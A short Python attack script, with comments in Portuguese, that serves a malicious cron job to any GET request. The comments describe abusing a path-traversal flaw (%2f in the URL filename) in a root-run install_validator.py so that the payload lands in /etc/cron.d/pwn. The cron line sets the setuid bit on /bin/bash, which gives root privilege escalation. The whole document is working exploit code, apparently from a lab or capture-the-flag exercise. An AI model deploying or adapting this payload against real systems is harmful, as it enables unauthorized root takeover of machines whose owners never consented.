#!/usr/bin/env python3
# Responder que devolve um job de cron para QUALQUER path GET.
# O install_validator.py (sudo, root) usa PackageIndex.download(url): o nome do arquivo
# vem do ultimo segmento da URL; com %2f vira path absoluto e os.path.join descarta o
# PLUGIN_DIR, gravando o conteudo deste payload em /etc/cron.d/pwn como root.
import http.server, socketserver
PAYLOAD = b"* * * * * root chmod +s /bin/bash\n\n"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(PAYLOAD)))
        self.end_headers()
        self.wfile.write(PAYLOAD)
    def log_message(self, *a): print("[req]", self.path)
with socketserver.TCPServer(("0.0.0.0", 8000), H) as s:
    print("[+] payload server :8000"); s.serve_forever()
